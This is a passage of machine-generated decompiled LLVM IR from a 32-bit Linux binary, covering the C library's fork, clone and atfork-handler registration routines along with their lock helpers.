  br i1 %v1_80628b1, label %dec_label_pc_80628bc, label %dec_label_pc_80628b5

dec_label_pc_80628b5:                             ; preds = %entry
  %v0_80628b5 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_80628b5, i32* inttoptr (i32 108 to i32*), align 4
  br label %dec_label_pc_80628bc

dec_label_pc_80628bc:                             ; preds = %entry, %dec_label_pc_80628b5
  %v5_80628bc = icmp ult i32 %v0_80628ae, -4095
  %v1_80628c1 = icmp eq i1 %v5_80628bc, false
  call void @__pseudo_cond_branch(i1 %v1_80628c1, i32 134625224)
  ret i32 %v0_80628ae

; uselistorder directives
  uselistorder i32 %v0_80628ae, { 1, 0, 2 }
  uselistorder i32 %v0_8062891, { 1, 0, 2 }
  uselistorder i32 -2147483648, { 7, 5, 8, 9, 3, 6, 12, 0, 1, 2, 10, 4, 11 }
  uselistorder label %dec_label_pc_80628bc, { 1, 0 }
}

define i32 @__libc_fork(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v0_806291b2 = load i32, i32* @global_var_8078c4c.1647, align 4
  store i32 %v0_806291b2, i32* @ebx, align 4
  %v1_80629213 = icmp eq i32 %v0_806291b2, 0
  %v1_806292310 = icmp eq i1 %v1_80629213, false
  br i1 %v1_806292310, label %dec_label_pc_80628d3, label %dec_label_pc_806292c

dec_label_pc_80628d3:                             ; preds = %entry, %dec_label_pc_806291b.backedge
  %v0_80628da = phi i32 [ %v0_806291b, %dec_label_pc_806291b.backedge ], [ %v0_806291b2, %entry ]
  %v1_80628d3 = add i32 %v0_80628da, 20
  %v2_80628d3 = inttoptr i32 %v1_80628d3 to i32*
  %v3_80628d3 = load i32, i32* %v2_80628d3, align 4
  %v1_80628d6 = icmp eq i32 %v3_80628d3, 0
  br i1 %v1_80628d6, label %dec_label_pc_806291b.backedge, label %dec_label_pc_80628da

dec_label_pc_806291b.backedge:                    ; preds = %dec_label_pc_80628da.dec_label_pc_806291b.backedge_crit_edge, %dec_label_pc_80628d3
  %v0_806291b = phi i32 [ %v0_806291b.pre, %dec_label_pc_80628da.dec_label_pc_806291b.backedge_crit_edge ], [ %v0_80628da, %dec_label_pc_80628d3 ]
  store i32 %v0_806291b, i32* @ebx, align 4
  %v1_8062921 = icmp eq i32 %v0_806291b, 0
  %v1_8062923 = icmp eq i1 %v1_8062921, false
  br i1 %v1_8062923, label %dec_label_pc_80628d3, label %dec_label_pc_806291b.dec_label_pc_806292c.loopexit1_crit_edge

dec_label_pc_80628da:                             ; preds = %dec_label_pc_80628d3
  store i32 %v0_80628da, i32* @esi, align 4
  %v1_80628e0 = add i32 %v3_80628d3, 1
  store i32 %v3_80628d3, i32* %eax.global-to-local, align 4
  %v3_80628e5 = load i32, i32* %v2_80628d3, align 4
  %v16_80628e5 = icmp eq i32 %v3_80628e5, %v3_80628d3
  %v23_80628e5 = select i1 %v16_80628e5, i32 %v1_80628e0, i32 %v3_80628e5
  store i32 %v23_80628e5, i32* %v2_80628d3, align 4
  store i32 %v3_80628e5, i32* %eax.global-to-local, align 4
  %v1_80628ec = icmp eq i1 %v16_80628e5, false
  br i1 %v1_80628ec, label %dec_label_pc_80628da.dec_label_pc_806291b.backedge_crit_edge, label %dec_label_pc_80628ee

dec_label_pc_80628da.dec_label_pc_806291b.backedge_crit_edge: ; preds = %dec_label_pc_80628da
  %v0_806291b.pre = load i32, i32* @global_var_8078c4c.1647, align 4
  br label %dec_label_pc_806291b.backedge

dec_label_pc_80628ee:                             ; preds = %dec_label_pc_80628da
  %v8_8062900 = ptrtoint i32* %stack_var_-48 to i32
  br label %dec_label_pc_80628f0

dec_label_pc_80628f0:                             ; preds = %dec_label_pc_8062913, %dec_label_pc_80628ee
  %storemerge = phi i32 [ 0, %dec_label_pc_80628ee ], [ %v8_8062900, %dec_label_pc_8062913 ]
  store i32 %storemerge, i32* @esi, align 4
  %v0_80628f0 = load i32, i32* @ebx, align 4
  %v1_80628f0 = add i32 %v0_80628f0, 4
  %v2_80628f0 = inttoptr i32 %v1_80628f0 to i32*
  %v3_80628f0 = load i32, i32* %v2_80628f0, align 4
  store i32 %v3_80628f0, i32* %eax.global-to-local, align 4
  %v1_80628f3 = icmp eq i32 %v3_80628f0, 0
  br i1 %v1_80628f3, label %dec_label_pc_80628f9, label %dec_label_pc_80628f7

dec_label_pc_80628f7:                             ; preds = %dec_label_pc_80628f0
  call void @__pseudo_call(i32 %v3_80628f0)
  %v0_8062903.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80628f9

dec_label_pc_80628f9:                             ; preds = %dec_label_pc_80628f0, %dec_label_pc_80628f7
  %v0_8062903 = phi i32 [ %v0_80628f0, %dec_label_pc_80628f0 ], [ %v0_8062903.pre, %dec_label_pc_80628f7 ]
  store i32 %v8_8062900, i32* %eax.global-to-local, align 4
  store i32 %v0_8062903, i32* %stack_var_-48, align 4
  %v1_8062905 = inttoptr i32 %v0_8062903 to i32*
  %v2_8062905 = load i32, i32* %v1_8062905, align 4
  store i32 %v2_8062905, i32* @ebx, align 4
  %v1_806290a = icmp eq i32 %v2_8062905, 0
  %v1_806290c = icmp eq i1 %v1_806290a, false
  br i1 %v1_806290c, label %dec_label_pc_8062913, label %dec_label_pc_806292c

dec_label_pc_8062913:                             ; preds = %dec_label_pc_80628f9
  %v1_8062913 = add i32 %v2_8062905, 20
  %v2_8062913 = inttoptr i32 %v1_8062913 to i32*
  %v3_8062913 = load i32, i32* %v2_8062913, align 4
  %v4_8062913 = add i32 %v3_8062913, 1
  store i32 %v4_8062913, i32* %v2_8062913, align 4
  br label %dec_label_pc_80628f0

dec_label_pc_806291b.dec_label_pc_806292c.loopexit1_crit_edge: ; preds = %dec_label_pc_806291b.backedge
  br label %dec_label_pc_806292c

dec_label_pc_806292c:                             ; preds = %dec_label_pc_80628f9, %entry, %dec_label_pc_806291b.dec_label_pc_806292c.loopexit1_crit_edge
  %v0_806292c = load i32, i32* inttoptr (i32 8 to i32*), align 8
  store i32 %v0_806292c, i32* @edx, align 4
  %v0_8062933 = load i32, i32* @global_var_8075b6c.1564, align 4
  %v12_8062933 = icmp eq i32 %v0_8062933, %v0_806292c
  call void @__pseudo_cond_branch(i1 %v12_8062933, i32 ptrtoint (i32* @global_var_8062960.1648 to i32))
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 1, i32* @ecx, align 4
  %v0_8062942 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_8062942 = icmp eq i32 %v0_8062942, 0
  call void @__pseudo_cond_branch(i1 %v1_8062942, i32 134621517)
  %v0_806294c = load i32, i32* @global_var_8075b64.1566, align 4
  %v1_806294c = load i32, i32* @ecx, align 4
  %v2_806294c = load i32, i32* %eax.global-to-local, align 4
  %v13_806294c = icmp eq i32 %v2_806294c, %v0_806294c
  %v20_806294c = select i1 %v13_806294c, i32 %v1_806294c, i32 %v0_806294c
  store i32 %v20_806294c, i32* @global_var_8075b64.1566, align 4
  store i32 %v0_806294c, i32* %eax.global-to-local, align 4
  %v1_8062954 = icmp eq i1 %v13_806294c, false
  call void @__pseudo_cond_branch(i1 %v1_8062954, i32 134621908)
  ret i32 %v0_806294c

; uselistorder directives
  uselistorder i32 %v0_806294c, { 1, 0, 3, 2 }
  uselistorder i32 %v0_8062903, { 1, 0 }
  uselistorder i32 %v8_8062900, { 1, 0 }
  uselistorder i32 %v3_80628e5, { 1, 2, 0 }
  uselistorder i32 %v0_806291b, { 2, 1, 0 }
  uselistorder i32 %v3_80628d3, { 0, 2, 1, 3 }
  uselistorder i32 %v0_80628da, { 1, 0, 2 }
  uselistorder label %dec_label_pc_806292c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80628f9, { 1, 0 }
  uselistorder label %dec_label_pc_80628d3, { 1, 0 }
}

define i32 @function_806295a() local_unnamed_addr {
dec_label_pc_806295a:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %v0_806295a = load i32, i32* @edx, align 4
  store i32 %v0_806295a, i32* @global_var_8075b6c.1564, align 4
  %v0_8062960 = load i32, i32* @global_var_8075b68.1565, align 8
  %v1_8062960 = add i32 %v0_8062960, 1
  store i32 %v1_8062960, i32* @global_var_8075b68.1565, align 8
  %v0_8062966 = load i32, i32* inttoptr (i32 108 to i32*), align 4
  store i32 %v0_8062966, i32* %eax.global-to-local, align 4
  %v1_806296f = load i32, i32* @ebp, align 4
  %v2_806296f = add i32 %v1_806296f, -20
  %v3_806296f = inttoptr i32 %v2_806296f to i32*
  store i32 %v0_8062966, i32* %v3_806296f, align 4
  %v0_8062972 = load i32, i32* %eax.global-to-local, align 4
  %v1_8062972 = sub i32 0, %v0_8062972
  store i32 %v1_8062972, i32* inttoptr (i32 108 to i32*), align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  store i32 120, i32* %eax.global-to-local, align 4
  %v8_8062992 = call i32 (i32 (i32*)*, i32*, i32, i32*, ...) @clone(i32 (i32*)* inttoptr (i32 18874385 to i32 (i32*)*), i32* null, i32 0, i32* null)
  store i32 %v8_8062992, i32* %eax.global-to-local, align 4
  %tmp = icmp ult i32 %v8_8062992, -4095
  br i1 %tmp, label %dec_label_pc_80629b0, label %dec_label_pc_806299e

dec_label_pc_806299e:                             ; preds = %dec_label_pc_806295a
  store i32 -8, i32* %eax.global-to-local, align 4
  %v1_80629a3 = sub i32 0, %v8_8062992
  store i32 %v1_80629a3, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_8062a4a

dec_label_pc_80629b0:                             ; preds = %dec_label_pc_806295a
  %v1_80629b0 = icmp eq i32 %v8_8062992, 0
  store i32 %v8_8062992, i32* @esi, align 4
  %v1_80629b4 = icmp eq i1 %v1_80629b0, false
  br i1 %v1_80629b4, label %dec_label_pc_8062a4a, label %dec_label_pc_80629ba

dec_label_pc_80629ba:                             ; preds = %dec_label_pc_80629b0
  %v0_80629ba = load i32, i32* @global_var_8078c48.1649, align 8
  store i32 %v0_80629ba, i32* %eax.global-to-local, align 4
  %v1_80629bf = icmp eq i32 %v0_80629ba, 0
  br i1 %v1_80629bf, label %dec_label_pc_80629c6, label %dec_label_pc_80629c3

dec_label_pc_80629c3:                             ; preds = %dec_label_pc_80629ba
  %v1_80629c3 = inttoptr i32 %v0_80629ba to i32*
  %v2_80629c3 = load i32, i32* %v1_80629c3, align 4
  %v3_80629c3 = add i32 %v2_80629c3, 4
  store i32 %v3_80629c3, i32* %v1_80629c3, align 4
  br label %dec_label_pc_80629c6

dec_label_pc_80629c6:                             ; preds = %dec_label_pc_80629ba, %dec_label_pc_80629c3
  %v0_80629c6 = load i32, i32* inttoptr (i32 104 to i32*), align 8
  store i32 %v0_80629c6, i32* inttoptr (i32 108 to i32*), align 4
  %storemerge13 = load i32, i32* bitcast (i32** @global_var_8071920.1563 to i32*), align 4
  store i32 %storemerge13, i32* %eax.global-to-local, align 4
  %v1_80629f114 = icmp eq i32 %storemerge13, 0
  %v1_80629f321 = icmp eq i1 %v1_80629f114, false
  br i1 %v1_80629f321, label %dec_label_pc_80629d9, label %dec_label_pc_80629f5

dec_label_pc_80629d9:                             ; preds = %dec_label_pc_80629c6, %dec_label_pc_80629d9
  %v0_80629d9 = phi i32 [ %storemerge, %dec_label_pc_80629d9 ], [ %storemerge13, %dec_label_pc_80629c6 ]
  %v1_80629d9 = add i32 %v0_80629d9, 64
  %v2_80629d9 = inttoptr i32 %v1_80629d9 to i32*
  store i32 0, i32* %v2_80629d9, align 4
  %v0_80629e0 = load i32, i32* %eax.global-to-local, align 4
  %v1_80629e0 = add i32 %v0_80629e0, 60
  %v2_80629e0 = inttoptr i32 %v1_80629e0 to i32*
  store i32 0, i32* %v2_80629e0, align 4
  %v0_80629e7 = load i32, i32* %eax.global-to-local, align 4
  %v1_80629e7 = add i32 %v0_80629e7, 56
  %v2_80629e7 = inttoptr i32 %v1_80629e7 to i32*
  store i32 0, i32* %v2_80629e7, align 4
  %v0_80629ee = load i32, i32* %eax.global-to-local, align 4
  %v1_80629ee = add i32 %v0_80629ee, 32
  %v2_80629ee = inttoptr i32 %v1_80629ee to i32*
  %storemerge = load i32, i32* %v2_80629ee, align 4
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_80629f1 = icmp eq i32 %storemerge, 0
  %v1_80629f3 = icmp eq i1 %v1_80629f1, false
  br i1 %v1_80629f3, label %dec_label_pc_80629d9, label %dec_label_pc_80629f1.dec_label_pc_80629f5_crit_edge

dec_label_pc_80629f1.dec_label_pc_80629f5_crit_edge: ; preds = %dec_label_pc_80629d9
  br label %dec_label_pc_80629f5

dec_label_pc_80629f5:                             ; preds = %dec_label_pc_80629f1.dec_label_pc_80629f5_crit_edge, %dec_label_pc_80629c6
  store i32 0, i32* @global_var_8075b6c.1564, align 4
  store i32 0, i32* @global_var_8075b68.1565, align 8
  store i32 0, i32* @global_var_8075b64.1566, align 4
  %v0_8062a351 = load i32, i32* @ebp, align 4
  %v1_8062a352 = add i32 %v0_8062a351, -16
  %v2_8062a353 = inttoptr i32 %v1_8062a352 to i32*
  %v3_8062a354 = load i32, i32* %v2_8062a353, align 4
  %v4_8062a355 = icmp eq i32 %v3_8062a354, 0
  %v1_8062a3912 = icmp eq i1 %v4_8062a355, false
  br i1 %v1_8062a3912, label %dec_label_pc_8062a15, label %dec_label_pc_8062a3b

dec_label_pc_8062a15:                             ; preds = %dec_label_pc_80629f5, %dec_label_pc_8062a23
  %v3_8062a15 = phi i32 [ %v3_8062a35, %dec_label_pc_8062a23 ], [ %v3_8062a354, %dec_label_pc_80629f5 ]
  %v0_8062a15 = phi i32 [ %v0_8062a35, %dec_label_pc_8062a23 ], [ %v0_8062a351, %dec_label_pc_80629f5 ]
  %v1_8062a18 = inttoptr i32 %v3_8062a15 to i32*
  %v2_8062a18 = load i32, i32* %v1_8062a18, align 4
  store i32 %v2_8062a18, i32* %eax.global-to-local, align 4
  %v1_8062a1a = add i32 %v2_8062a18, 12
  %v2_8062a1a = inttoptr i32 %v1_8062a1a to i32*
  %v3_8062a1a = load i32, i32* %v2_8062a1a, align 4
  store i32 %v3_8062a1a, i32* %eax.global-to-local, align 4
  %v1_8062a1d = icmp eq i32 %v3_8062a1a, 0
  br i1 %v1_8062a1d, label %dec_label_pc_8062a23, label %dec_label_pc_8062a21

dec_label_pc_8062a21:                             ; preds = %dec_label_pc_8062a15
  call void @__pseudo_call(i32 %v3_8062a1a)
  %v0_8062a23.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_8062a23

dec_label_pc_8062a23:                             ; preds = %dec_label_pc_8062a15, %dec_label_pc_8062a21
  %v0_8062a23 = phi i32 [ %v0_8062a15, %dec_label_pc_8062a15 ], [ %v0_8062a23.pre, %dec_label_pc_8062a21 ]
  %v1_8062a23 = add i32 %v0_8062a23, -16
  %v2_8062a23 = inttoptr i32 %v1_8062a23 to i32*
  %v3_8062a23 = load i32, i32* %v2_8062a23, align 4
  store i32 %v3_8062a23, i32* %ecx.global-to-local, align 4
  %v1_8062a26 = inttoptr i32 %v3_8062a23 to i32*
  %v2_8062a26 = load i32, i32* %v1_8062a26, align 4
  store i32 %v2_8062a26, i32* %eax.global-to-local, align 4
  %v1_8062a28 = add i32 %v2_8062a26, 20
  %v2_8062a28 = inttoptr i32 %v1_8062a28 to i32*
  store i32 1, i32* %v2_8062a28, align 4
  %v0_8062a2f = load i32, i32* %ecx.global-to-local, align 4
  %v1_8062a2f = add i32 %v0_8062a2f, 4
  %v2_8062a2f = inttoptr i32 %v1_8062a2f to i32*
  %v3_8062a2f = load i32, i32* %v2_8062a2f, align 4
  store i32 %v3_8062a2f, i32* %eax.global-to-local, align 4
  %v1_8062a32 = load i32, i32* @ebp, align 4
  %v2_8062a32 = add i32 %v1_8062a32, -16
  %v3_8062a32 = inttoptr i32 %v2_8062a32 to i32*
  store i32 %v3_8062a2f, i32* %v3_8062a32, align 4
  %v0_8062a35 = load i32, i32* @ebp, align 4
  %v1_8062a35 = add i32 %v0_8062a35, -16
  %v2_8062a35 = inttoptr i32 %v1_8062a35 to i32*
  %v3_8062a35 = load i32, i32* %v2_8062a35, align 4
  %v4_8062a35 = icmp eq i32 %v3_8062a35, 0
  %v1_8062a39 = icmp eq i1 %v4_8062a35, false
  br i1 %v1_8062a39, label %dec_label_pc_8062a15, label %dec_label_pc_8062a3b

dec_label_pc_8062a3b:                             ; preds = %dec_label_pc_8062a23, %dec_label_pc_80629f5
  store i32 0, i32* @global_var_8077d78.1650, align 8
  %v0_8062a45 = call i32 @function_8062aca()
  store i32 %v0_8062a45, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8062a4a

dec_label_pc_8062a4a:                             ; preds = %dec_label_pc_80629b0, %dec_label_pc_8062a3b, %dec_label_pc_806299e
  %v0_8062a4a = load i32, i32* @ebp, align 4
  %v1_8062a4a = add i32 %v0_8062a4a, -20
  %v2_8062a4a = inttoptr i32 %v1_8062a4a to i32*
  %v3_8062a4a = load i32, i32* %v2_8062a4a, align 4
  store i32 %v3_8062a4a, i32* inttoptr (i32 108 to i32*), align 4
  %v0_8062a54 = load i32, i32* @global_var_8075b68.1565, align 8
  %v1_8062a59 = add i32 %v0_8062a54, -1
  %v8_8062a59 = icmp eq i32 %v1_8062a59, 0
  store i32 %v1_8062a59, i32* %eax.global-to-local, align 4
  store i32 %v1_8062a59, i32* @global_var_8075b68.1565, align 8
  %v1_8062a61 = icmp eq i1 %v8_8062a59, false
  call void @__pseudo_cond_branch(i1 %v1_8062a61, i32 134621892)
  store i32 0, i32* @global_var_8075b6c.1564, align 4
  %v0_8062a6d = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_8062a6d = icmp eq i32 %v0_8062a6d, 0
  call void @__pseudo_cond_branch(i1 %v1_8062a6d, i32 134621816)
  %v0_8062a77 = load i32, i32* @global_var_8075b64.1566, align 4
  %v1_8062a77 = add i32 %v0_8062a77, -1
  %v9_8062a77 = icmp eq i32 %v1_8062a77, 0
  store i32 %v1_8062a77, i32* @global_var_8075b64.1566, align 4
  %v1_8062a7f = icmp eq i1 %v9_8062a77, false
  call void @__pseudo_cond_branch(i1 %v1_8062a7f, i32 134621924)
  ret i32 %v1_8062a59

; uselistorder directives
  uselistorder i32 %v1_8062a77, { 1, 0 }
  uselistorder i32 %v1_8062a59, { 0, 1, 3, 2 }
  uselistorder i32 %v3_8062a35, { 1, 0 }
  uselistorder i32 %v0_8062a35, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v8_8062992, { 2, 3, 1, 0, 4 }
  uselistorder i32* %eax.global-to-local, { 7, 6, 8, 9, 10, 11, 1, 2, 3, 4, 5, 12, 16, 0, 13, 14, 15 }
  uselistorder label %dec_label_pc_8062a4a, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8062a23, { 1, 0 }
  uselistorder label %dec_label_pc_8062a15, { 1, 0 }
  uselistorder label %dec_label_pc_80629d9, { 1, 0 }
  uselistorder label %dec_label_pc_80629c6, { 1, 0 }
}

define i32 @function_8062a81() local_unnamed_addr {
dec_label_pc_8062a81:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %v0_8062ac41 = load i32, i32* @ebp, align 4
  %v1_8062ac42 = add i32 %v0_8062ac41, -16
  %v2_8062ac43 = inttoptr i32 %v1_8062ac42 to i32*
  %v3_8062ac44 = load i32, i32* %v2_8062ac43, align 4
  %v4_8062ac45 = icmp eq i32 %v3_8062ac44, 0
  %v1_8062ac812 = icmp eq i1 %v4_8062ac45, false
  br i1 %v1_8062ac812, label %dec_label_pc_8062a83, label %dec_label_pc_8062ac4._crit_edge

dec_label_pc_8062a83:                             ; preds = %dec_label_pc_8062a81, %dec_label_pc_8062abb
  %v3_8062a83 = phi i32 [ %v3_8062ac4, %dec_label_pc_8062abb ], [ %v3_8062ac44, %dec_label_pc_8062a81 ]
  %v0_8062a83 = phi i32 [ %v0_8062ac4, %dec_label_pc_8062abb ], [ %v0_8062ac41, %dec_label_pc_8062a81 ]
  store i32 %v3_8062a83, i32* %ecx.global-to-local, align 4
  %v1_8062a86 = inttoptr i32 %v3_8062a83 to i32*
  %v2_8062a86 = load i32, i32* %v1_8062a86, align 4
  store i32 %v2_8062a86, i32* %eax.global-to-local, align 4
  %v1_8062a88 = add i32 %v2_8062a86, 8
  %v2_8062a88 = inttoptr i32 %v1_8062a88 to i32*
  %v3_8062a88 = load i32, i32* %v2_8062a88, align 4
  store i32 %v3_8062a88, i32* %eax.global-to-local, align 4
  %v1_8062a8b = icmp eq i32 %v3_8062a88, 0
  br i1 %v1_8062a8b, label %dec_label_pc_8062a91, label %dec_label_pc_8062a8f

dec_label_pc_8062a8f:                             ; preds = %dec_label_pc_8062a83
  %v0_8062a8f = load i32, i32* @esp, align 4
  %v1_8062a8f = add i32 %v0_8062a8f, -4
  %v2_8062a8f = inttoptr i32 %v1_8062a8f to i32*
  store i32 134621841, i32* %v2_8062a8f, align 4
  call void @__pseudo_call(i32 %v3_8062a88)
  %v0_8062a91.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_8062a91

dec_label_pc_8062a91:                             ; preds = %dec_label_pc_8062a83, %dec_label_pc_8062a8f
  %v0_8062a91 = phi i32 [ %v0_8062a83, %dec_label_pc_8062a83 ], [ %v0_8062a91.pre, %dec_label_pc_8062a8f ]
  %v1_8062a91 = add i32 %v0_8062a91, -16
  %v2_8062a91 = inttoptr i32 %v1_8062a91 to i32*
  %v3_8062a91 = load i32, i32* %v2_8062a91, align 4
  store i32 %v3_8062a91, i32* %eax.global-to-local, align 4
  %v1_8062a94 = inttoptr i32 %v3_8062a91 to i32*
  %v2_8062a94 = load i32, i32* %v1_8062a94, align 4
  store i32 %v2_8062a94, i32* %ecx.global-to-local, align 4
  %v1_8062a96 = add i32 %v2_8062a94, 20
  %v2_8062a96 = inttoptr i32 %v1_8062a96 to i32*
  %v3_8062a96 = load i32, i32* %v2_8062a96, align 4
  %v4_8062a96 = add i32 %v3_8062a96, -1
  %v11_8062a96 = icmp eq i32 %v4_8062a96, 0
  store i32 %v4_8062a96, i32* %v2_8062a96, align 4
  %v1_8062a9a = zext i1 %v11_8062a96 to i32
  %v2_8062a9a = load i32, i32* %eax.global-to-local, align 4
  %v3_8062a9a = and i32 %v2_8062a9a, -256
  %v4_8062a9a = or i32 %v3_8062a9a, %v1_8062a9a
  store i32 %v4_8062a9a, i32* @eax, align 4
  %v4_8062a9d = icmp eq i1 %v11_8062a96, false
  br i1 %v4_8062a9d, label %dec_label_pc_8062abb, label %dec_label_pc_8062aa1

dec_label_pc_8062aa1:                             ; preds = %dec_label_pc_8062a91
  %v0_8062aa1 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8062aa1 = add i32 %v0_8062aa1, 24
  %v2_8062aa1 = inttoptr i32 %v1_8062aa1 to i32*
  %v3_8062aa1 = load i32, i32* %v2_8062aa1, align 4
  %v4_8062aa1 = icmp eq i32 %v3_8062aa1, 0
  br i1 %v4_8062aa1, label %dec_label_pc_8062abb, label %dec_label_pc_8062aa7

dec_label_pc_8062aa7:                             ; preds = %dec_label_pc_8062aa1
  store i32 240, i32* %eax.global-to-local, align 4
  store i32 129, i32* %ecx.global-to-local, align 4
  %v1_8062ab9 = call i32 @int80_syscall(i32 240)
  store i32 %v1_8062ab9, i32* @eax, align 4
  br label %dec_label_pc_8062abb

dec_label_pc_8062abb:                             ; preds = %dec_label_pc_8062aa7, %dec_label_pc_8062aa1, %dec_label_pc_8062a91
  %v0_8062abb = load i32, i32* @ebp, align 4
  %v1_8062abb = add i32 %v0_8062abb, -16
  %v2_8062abb = inttoptr i32 %v1_8062abb to i32*
  %v3_8062abb = load i32, i32* %v2_8062abb, align 4
  %v1_8062abe = add i32 %v3_8062abb, 4
  %v2_8062abe = inttoptr i32 %v1_8062abe to i32*
  %v3_8062abe = load i32, i32* %v2_8062abe, align 4
  store i32 %v3_8062abe, i32* %v2_8062abb, align 4
  %v0_8062ac4 = load i32, i32* @ebp, align 4
  %v1_8062ac4 = add i32 %v0_8062ac4, -16
  %v2_8062ac4 = inttoptr i32 %v1_8062ac4 to i32*
  %v3_8062ac4 = load i32, i32* %v2_8062ac4, align 4
  %v4_8062ac4 = icmp eq i32 %v3_8062ac4, 0
  %v1_8062ac8 = icmp eq i1 %v4_8062ac4, false
  br i1 %v1_8062ac8, label %dec_label_pc_8062a83, label %dec_label_pc_8062ac4._crit_edge

dec_label_pc_8062ac4._crit_edge:                  ; preds = %dec_label_pc_8062abb, %dec_label_pc_8062a81
  %v2_8062ac8 = load i32, i32* @eax, align 4
  ret i32 %v2_8062ac8

; uselistorder directives
  uselistorder i32 %v3_8062ac4, { 1, 0 }
  uselistorder i32 %v0_8062ac4, { 1, 0 }
  uselistorder i1 %v11_8062a96, { 1, 0 }
  uselistorder i32 %v4_8062a96, { 1, 0 }
  uselistorder i32 %v3_8062a83, { 1, 0 }
  uselistorder label %dec_label_pc_8062a91, { 1, 0 }
  uselistorder label %dec_label_pc_8062a83, { 1, 0 }
}

define i32 @function_8062aca() local_unnamed_addr {
dec_label_pc_8062aca:
  %v0_8062acd = load i32, i32* @esi, align 4
  ret i32 %v0_8062acd
}

define i32 @_L_lock_70() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_8075b64.1566 to i32), i32* @ecx, align 4
  %v0_8062ada = call i32 @__lll_lock_wait_private()
  %v0_8062adf = call i32 @function_806295a()
  ret i32 %v0_8062adf
}

define i32 @_L_unlock_167() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_8075b64.1566 to i32), i32* @eax, align 4
  %v0_8062aea = call i32 @__lll_unlock_wake_private()
  store i32 %v0_8062aea, i32* @eax, align 4
  %v0_8062aef = call i32 @function_8062a81()
  ret i32 %v0_8062aef
}

define i32 @__linkin_atfork(i32* %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_8062af4 = load i32, i32* @ebx, align 4
  store i32 %v0_8062af4, i32* %stack_var_-4, align 4
  store i32 %tmp3, i32* %ecx.global-to-local, align 4
  %v0_8062af9.pre = load i32, i32* @global_var_8078c4c.1647, align 4
  br label %dec_label_pc_8062af9

dec_label_pc_8062af9:                             ; preds = %dec_label_pc_8062af9, %entry
  %v1_8062aff = phi i32 [ %v1_8062b03, %dec_label_pc_8062af9 ], [ %tmp3, %entry ]
  %v0_8062af9 = phi i32 [ %v20_8062b03, %dec_label_pc_8062af9 ], [ %v0_8062af9.pre, %entry ]
  store i32 %v0_8062af9, i32* %ebx.global-to-local, align 4
  %v2_8062aff = inttoptr i32 %v1_8062aff to i32*
  store i32 %v0_8062af9, i32* %v2_8062aff, align 4
  %v0_8062b01 = load i32, i32* %ebx.global-to-local, align 4
  %v0_8062b03 = load i32, i32* @global_var_8078c4c.1647, align 4
  %v1_8062b03 = load i32, i32* %ecx.global-to-local, align 4
  %v13_8062b03 = icmp eq i32 %v0_8062b03, %v0_8062b01
  %v20_8062b03 = select i1 %v13_8062b03, i32 %v1_8062b03, i32 %v0_8062b03
  store i32 %v20_8062b03, i32* @global_var_8078c4c.1647, align 4
  %v12_8062b0b = icmp eq i32 %v0_8062b03, %v0_8062b01
  %v1_8062b0d = icmp eq i1 %v12_8062b0b, false
  br i1 %v1_8062b0d, label %dec_label_pc_8062af9, label %dec_label_pc_8062b0f

dec_label_pc_8062b0f:                             ; preds = %dec_label_pc_8062af9
  %v2_8062b0f = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8062b0f, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8062b03

; uselistorder directives
  uselistorder i32 %v20_8062b03, { 1, 0 }
  uselistorder i32 %v1_8062b03, { 1, 0 }
  uselistorder i32 %v0_8062b03, { 1, 0, 3, 2 }
  uselistorder i32 %v0_8062af9, { 1, 0 }
  uselistorder i32* @global_var_8078c4c.1647, { 3, 4, 0, 1, 2 }
}

define i32 @__GI___register_atfork() local_unnamed_addr {
entry:
  %v0_8062b1c = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_8062b1c = icmp eq i32 %v0_8062b1c, 0
  call void @__pseudo_cond_branch(i1 %v1_8062b1c, i32 134621991)
  %v0_8062b26 = load i32, i32* @global_var_8077d78.1650, align 8
  %v13_8062b26 = icmp eq i32 %v0_8062b26, 0
  %v20_8062b26 = select i1 %v13_8062b26, i32 1, i32 %v0_8062b26
  store i32 %v20_8062b26, i32* @global_var_8077d78.1650, align 8
  %v1_8062b2e = icmp eq i1 %v13_8062b26, false
  call void @__pseudo_cond_branch(i1 %v1_8062b2e, i32 134622172)
  ret i32 %v0_8062b26

; uselistorder directives
  uselistorder i32 %v0_8062b26, { 0, 2, 1 }
}

define i32 @function_8062b34() local_unnamed_addr {
dec_label_pc_8062b34:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  store i32 ptrtoint (i32* @global_var_8077d7c.1651 to i32), i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8062b39

dec_label_pc_8062b39:                             ; preds = %dec_label_pc_8062b4d, %dec_label_pc_8062b34
  %v0_8062b4d4 = phi i32 [ %v2_8062b4d, %dec_label_pc_8062b4d ], [ ptrtoint (i32* @global_var_8077d7c.1651 to i32), %dec_label_pc_8062b34 ]
  store i32 0, i32* %ecx.global-to-local, align 4
  %v2_8062b40 = add i32 %v0_8062b4d4, 24
  br label %dec_label_pc_8062b3d

